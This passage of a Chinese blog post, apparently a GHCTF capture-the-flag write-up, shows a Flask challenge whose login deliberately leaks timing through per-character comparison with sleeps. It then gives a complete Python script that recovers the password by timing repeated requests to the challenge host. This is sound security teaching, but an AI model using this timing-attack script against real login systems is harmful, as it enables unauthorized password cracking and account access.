+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_from_directory<br><span class="hljs-keyword">from</span> flask_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> hashlib<br><br>app = Flask(__name__)<br>app.secret_key = hashlib.sha256(<span class="hljs-built_in">str</span>(time.time()).encode()).hexdigest()<br>app.config[<span class="hljs-string">&#x27;SESSION_TYPE&#x27;</span>] = <span class="hljs-string">&#x27;filesystem&#x27;</span><br>app.config[<span class="hljs-string">&#x27;SESSION_FILE_DIR&#x27;</span>] = <span class="hljs-string">&#x27;./flask_session&#x27;</span><br>Session(app)<br><br><span class="hljs-comment"># 用户配置</span><br>CORRECT_PASSWORD = <span class="hljs-string">&#x27;0123456789012345&#x27;</span><br>VERIFICATION_CODE = <span class="hljs-string">&#x27;this_is_my_strong!-verifid_~code&#x27;</span> <span class="hljs-comment"># 验证码</span><br>ADJECTIVES = [<span class="hljs-string">&#x27;Happy&#x27;</span>, <span class="hljs-string">&#x27;Clever&#x27;</span>, <span class="hljs-string">&#x27;Swift&#x27;</span>, <span class="hljs-string">&#x27;Brave&#x27;</span>, <span class="hljs-string">&#x27;Gentle&#x27;</span>, <span class="hljs-string">&#x27;Honest&#x27;</span>, <span class="hljs-string">&#x27;Lucky&#x27;</span>, <span class="hljs-string">&#x27;Wise&#x27;</span>]<br>NOUNS = [<span class="hljs-string">&#x27;Panda&#x27;</span>, <span class="hljs-string">&#x27;Tiger&#x27;</span>, <span class="hljs-string">&#x27;Eagle&#x27;</span>, <span class="hljs-string">&#x27;Dolphin&#x27;</span>, <span class="hljs-string">&#x27;Phoenix&#x27;</span>, <span class="hljs-string">&#x27;Wolf&#x27;</span>, <span class="hljs-string">&#x27;Lion&#x27;</span>, <span class="hljs-string">&#x27;Dragon&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_username</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;生成随机用户名 格式：形容词_名词_数字&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;random.choice(ADJECTIVES)&#125;</span>_<span class="hljs-subst">&#123;random.choice(NOUNS)&#125;</span>_<span class="hljs-subst">&#123;random.randint(<span class="hljs-number">100</span>, <span class="hljs-number">999</span>)&#125;</span>&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        PASSWORD = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(PASSWORD) != <span class="hljs-built_in">len</span>(CORRECT_PASSWORD):<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, error=<span class="hljs-string">&#x27;密码长度错误&#x27;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(PASSWORD)):<br>            <span class="hljs-keyword">if</span> PASSWORD[i] != CORRECT_PASSWORD[i]:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, error=<span class="hljs-string">&#x27;密码错误&#x27;</span>)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>        session[<span class="hljs-string">&#x27;logged_in&#x27;</span>] = <span class="hljs-literal">True</span><br>        session[<span class="hljs-string">&#x27;username&#x27;</span>] = generate_random_username()<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;logged_in&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        user_code = request.form.get(<span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> user_code == VERIFICATION_CODE:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    flag = f.read().strip()<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, flag=flag)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;读取flag文件失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, error=<span class="hljs-string">&#x27;系统错误，请联系系统管理员&#x27;</span>)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, error=<span class="hljs-string">&#x27;验证码错误，请重新输入&#x27;</span>)<br>    <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
+</details>
+
+<p>&#x2F;login目录下存在明显的timing漏洞，可以根据响应时间来分析出密钥。</p>
+<p>理论上来说&#x2F;index目录下的verify_code也是逐字符比较，也可以timing attack。 但是由于字符比较很快，比较一个字符的速度是ns级（甚至更短），而网络波动动辄几十毫秒，甚至上百毫秒，因此很难利用这个比较时间来区分。非要区分的话，要把网络波动控制的很小很小，就要一个密码发很多很多次包取平均，减小网络传输速度本身的方差。但要达到ns级别，在实践上应该是不可行的。</p>
+<p>利用多次发包减小方差的方法实现了密码的爆破。结果是<code>sECurePAsS</code><br>我猜测这个<code>VERIFICATION_CODE</code>应该是用字典爆破。但是尝试了几个字典都没爆破出来，也可能是我选的字典不对。</p>
+<p>等待大佬wp ing</p>
+<details>
+<summary> 爆破密钥脚本: </summary>
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> moduleByMekrina <span class="hljs-keyword">import</span> my_ascii_list<br><br>proxies = &#123;<br>    <span class="hljs-string">&#x27;http&#x27;</span>: <span class="hljs-string">&#x27;http://localhost:8080&#x27;</span><br>&#125;<br>url = <span class="hljs-string">&#x27;http://node2.anna.nssctf.cn:28498/login&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cracker</span>():<br>    length = get_length()<br>    get_password(length)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_next_byte</span>(<span class="hljs-params">current, signal = <span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> signal:<br>        <span class="hljs-keyword">return</span> current<br>    <span class="hljs-keyword">if</span> current == my_ascii_list[-<span class="hljs-number">1</span>]:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> my_ascii_list[my_ascii_list.index(current) + <span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>():<br>    data = &#123;<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;\x00&#x27;</span><br>    &#125;<br>    session = requests.Session()<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        response = session.post(url=url, data=data)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;密码错误&#x27;</span> <span class="hljs-keyword">in</span> response.text):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;密码长度为: &#x27;</span>,<span class="hljs-built_in">len</span>(data[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(data[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        data[<span class="hljs-string">&#x27;password&#x27;</span>] += <span class="hljs-string">&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_time</span>(<span class="hljs-params">password, n = <span class="hljs-number">10</span></span>):<br>    data = &#123;<br>        <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>.join(password)<br>    &#125;<br>    total_time = <span class="hljs-number">0</span><br>    session = requests.Session()<br>    <span class="hljs-comment"># for proxies</span><br>    <span class="hljs-comment"># session.post(url=url,data=data, proxies = proxies)</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        start = time.time_ns()<br>        session.post(url=url,data=data)<br>        end = time.time_ns()<br>        total_time += (end-start)<br>    each_time = total_time / n<br>    <span class="hljs-keyword">return</span> each_time<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_base_time</span>(<span class="hljs-params">password,index</span>):<br>    run_time = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        password[index] = <span class="hljs-built_in">chr</span>(i) <br>        run_time.append(get_time(password=password, n=<span class="hljs-number">30</span>))<br>    base_time = run_time[<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span> run_time[<span class="hljs-number">0</span>] &lt; run_time[<span class="hljs-number">1</span>] <span class="hljs-keyword">else</span> run_time[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> base_time<br>        <br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_password</span>(<span class="hljs-params">length</span>):<br>    password = [<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;\x11&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>]<br>    <span class="hljs-comment"># password[0],password[1] = &#x27;s&#x27;, &#x27;E&#x27;</span><br>    index = <span class="hljs-number">7</span><br>    base_time = get_base_time(password=password,index=index)<br>    password[index] = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base_time: &quot;</span>, base_time // (<span class="hljs-number">10</span> ** <span class="hljs-number">6</span>), <span class="hljs-string">&quot; ms&quot;</span>)<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        signal = <span class="hljs-literal">False</span><br>        run_time = get_time(password=password)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;trying the <span class="hljs-subst">&#123;index&#125;</span> byte: &quot;</span>, password[index].encode(), <span class="hljs-string">&quot;  run_time: &quot;</span>, run_time // <span class="hljs-number">10</span>**<span class="hljs-number">6</span> , <span class="hljs-string">&quot;ms&quot;</span>)<br>        <span class="hljs-keyword">if</span>(run_time - base_time &gt; <span class="hljs-number">80</span> * <span class="hljs-number">10</span>**<span class="hljs-number">6</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;the <span class="hljs-subst">&#123;index&#125;</span> byte supposed to be <span class="hljs-subst">&#123;password[index].encode()&#125;</span>&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;trying to confirm it: &#x27;</span>)<br>            <br>            run_time = get_time(password, n=<span class="hljs-number">30</span>)<br>            <span class="hljs-keyword">if</span>(run_time - base_time &lt; <span class="hljs-number">80</span> * <span class="hljs-number">10</span>**<span class="hljs-number">6</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;confirm failed, trying next...&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;confirmed&#x27;</span>)<br>                base_time = run_time<br>                index += <span class="hljs-number">1</span><br>                signal = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">if</span>(index == length - <span class="hljs-number">1</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;done&#x27;</span>)<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span>(base_time - run_time &gt; <span class="hljs-number">80</span> * <span class="hljs-number">10</span>**<span class="hljs-number">6</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the last byte maybe mistaken&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;trying to confirm it&quot;</span>)<br>            run_time = get_time(password, n=<span class="hljs-number">30</span>)<br>            <span class="hljs-keyword">if</span>(base_time - run_time &lt; <span class="hljs-number">80</span> * <span class="hljs-number">10</span>**<span class="hljs-number">6</span>):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;runtime: &quot;</span>, run_time ,<span class="hljs-string">&quot;confirm failed, continue&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; confirmed, going back...&quot;</span>)<br>                base_time = run_time<br>                index = index - <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span>(index &lt; <span class="hljs-number">0</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the internet is not stable... stop&#x27;</span>)<br>                    <span class="hljs-keyword">break</span><br>        next_byte = get_next_byte(current=password[index], signal=signal)<br>        <span class="hljs-keyword">if</span>(next_byte == <span class="hljs-literal">None</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;next_byte: none&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br>        password[index] = next_byte<br>    <span class="hljs-built_in">print</span>(password)<br>    <span class="hljs-keyword">return</span> password<br>        <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    length = get_length()<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> my_ascii_list:<br>        runtime = get_time(password=char*length)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;test char : &#x27;</span>, char.encode(), <span class="hljs-string">&quot;runtime: &quot;</span> , runtime // <span class="hljs-number">10</span>**<span class="hljs-number">3</span>, <span class="hljs-string">&quot; us &quot;</span>)<br>        <br>cracker()<br><span class="hljs-comment">#test()</span><br><br><span class="hljs-comment"># sECurePAsS</span><br></code></pre></td></tr></table></figure>
+
+</details>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>GHCTF-web.misc-wp</div>
+      <div>http://mekrina.github.io/blogs/uncategorized/GHCTF-web-misc-wp/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/blogs/sql/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" title="sql注入绕过">
+                        <span class="hidden-mobile">sql注入绕过</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/blogs/js/events.js" ></script>
+<script  src="/blogs/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/blogs/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/blogs/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/blogs/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
